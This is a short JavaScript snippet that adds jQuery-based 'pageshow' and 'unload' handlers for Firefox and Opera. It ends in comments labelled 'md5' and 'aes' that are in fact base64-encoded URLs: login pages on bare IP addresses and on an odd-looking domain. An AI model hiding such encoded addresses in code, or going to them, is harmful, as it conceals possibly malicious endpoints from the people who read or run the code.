if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzguMTM0LjE3OS40NTo4MDA4LyMvbG9naW4vbG9naW4saHR0cHM6Ly93d3cueGZ3cWhxZWl3cS5jb20vIy9sb2dpbi9sb2dpbg==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/